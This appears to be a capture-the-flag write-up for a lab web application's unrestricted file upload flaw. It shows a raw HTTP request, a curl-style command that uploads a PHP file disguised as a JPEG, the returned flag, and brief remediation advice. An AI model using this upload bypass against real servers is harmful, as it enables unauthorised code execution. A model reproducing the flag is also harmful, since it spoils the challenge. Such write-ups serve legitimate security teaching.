
```bash

VULNERABILITY___

    => <input name="uploaded" type="file" /><br />  : type="file" -> allows attacker to upload file on anytype.
    => an attacker my upload malicios, html, js file to the server.

```
```bash
EXPLOIT___
    
    => SEND THE REQUEST: 
            GET http://192.168.8.5/?page=upload HTTP/1.1
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
            Pragma: no-cache
            Cache-Control: no-cache
            Content-Length: 0
            Referer: http://192.168.8.5/
            Host: 192.168.8.5
            Cookie: I_am_admin=68934a3e9455fa72420237eb05902327

    => THE RESPONSE WILL BE:
        <form enctype="multipart/form-data" action="#" method="POST"> #THE WEAK POINT WILL SHOWN BY OWASP AS 

            <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
            Choose an image to upload:
            <br />
            <input name="uploaded" type="file" /><br />     # SPOT THE WEAK POINT " "type="file"
            <br />
            <input type="submit" name="Upload" value="Upload">

        </form>

=> Use curl to execute the exploit.

POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@empty.php;type=image/jpeg' http://192.168.1.59/index.php\?page\=upload\#

then | grep flag to get => 
            <pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/upload.php succesfully uploaded.</pre>


SOLUTION__

    => strictly specify types for file uploads.
    => implement Client-Side validation and Server-side validation.